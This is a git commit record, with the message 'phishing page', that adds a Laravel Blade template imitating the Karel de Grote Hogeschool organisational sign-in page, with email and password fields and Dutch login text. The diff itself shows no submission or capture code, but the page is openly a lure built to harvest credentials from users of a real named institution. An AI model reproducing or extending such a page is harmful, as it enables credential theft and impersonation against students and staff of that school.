72a824624fa29cdb4cd0d2bb27aa966dd338f284
tymo.dekock <tymo.dekock@telenet.be>
2018-12-13 17:39:21 +0100

    phishing page

---
+++ larahack/hack/resources/views/welcome.blade.php
@@ -0,0 +1,17 @@
+@extends('layouts.app')
+
+@section('content')
+
+
+    <div class="kdg" alt="Image">xd
+    </div>
+
+
+<div class="content">
+  <div class="kdgheader">Karel de Grote Hogeschool</div>
+<div class="red">Aanmelden met uw organisatieaccount</div>
+<input id="userNameInput" name="UserName" type="email" value="" tabindex="1" class="text fullWidth" spellcheck="false" placeholder="iemand@example.com" autocomplete="off">
+<input id="passwordInput" name="Password" type="password" tabindex="2" class="text fullWidth" placeholder="Wachtwoord" autocomplete="off">
+
+
+@endsection
